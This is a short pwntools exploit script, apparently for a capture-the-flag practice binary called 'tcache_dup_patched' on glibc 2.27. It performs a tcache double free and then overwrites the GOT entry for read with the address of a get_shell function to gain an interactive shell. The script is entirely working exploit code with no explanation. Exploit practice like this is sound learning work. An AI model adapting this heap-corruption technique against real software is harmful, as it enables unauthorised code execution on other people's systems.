#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_dup_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process()
gdb.attach(p,gdbscript='''
            b*0x00000000004009ba
            b*0x00000000004009c7
            b*0x0000000000400a1f
            b*0x0000000000400a71
            b*0x0000000000400a95

           ''')

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',b'aaaa')

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'idx: ',b'0')
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'idx: ',b'0')

input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',p64(exe.got.read))

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',b'aaaaa')

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'200')
p.sendlineafter(b'Data: ',p64(exe.sym.get_shell))

p.interactive()
